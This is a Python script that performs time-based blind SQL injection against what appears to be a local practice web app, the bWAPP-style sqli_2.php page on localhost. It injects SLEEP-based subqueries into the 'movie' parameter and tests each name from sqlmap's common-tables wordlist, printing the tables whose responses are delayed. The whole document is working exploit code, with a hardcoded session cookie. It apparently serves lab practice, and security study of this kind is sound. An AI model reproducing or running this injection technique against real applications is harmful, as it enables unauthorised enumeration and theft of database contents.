import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sql_injection(s):
    print(f"Tables found:")
    with open("/usr/share/sqlmap/data/txt/common-tables.txt", "r") as tables:
        for table in tables:
            table = table.strip()
            url = f"http://127.0.0.1/sqli_2.php?movie=1+AND+(SELECT+SLEEP(4)+FROM+information_schema.tables+WHERE+table_name%3d'{table}')&action=go"
            cookies={'security_level':'0','PHPSESSID':'19e9bovm5a71qp7k1ininlusk6'}
            response = s.get(url,verify = False,cookies=cookies)
            if response.elapsed.total_seconds() > 2:
                print(f"{table}")
                             
def main():
    s = requests.Session()    
    print("(+) Retreiving tables...")
    sql_injection(s)  

if __name__ == "__main__":
    main()


    